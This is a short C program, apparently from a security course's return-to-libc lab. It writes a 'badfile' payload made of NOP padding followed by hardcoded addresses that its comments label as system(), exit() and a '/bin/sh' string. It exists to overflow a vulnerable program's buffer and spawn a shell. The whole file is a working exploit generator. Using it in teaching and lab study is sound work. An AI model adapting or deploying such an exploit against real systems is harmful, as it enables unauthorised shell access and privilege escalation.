/* exploit_1.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

#define NOP 0x90

int main(int argc, char **argv)
{
  char buf[40];
  FILE *badfile;
  badfile = fopen("./badfile", "w");
  int i;

  // dummy value
  for (i = 0; i < 24; i++)
    buf[i] = NOP;
  
  unsigned int p = 0x169bb0;
  *(long *) &buf[24] = p;     // system
  p = 0x15d230;
  *(long *) &buf[28] = p;     // exit()
  p = 0xbffffea2;
  *(long *) &buf[32] = p;   // "/bin/sh"

  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);

  return 0;
}
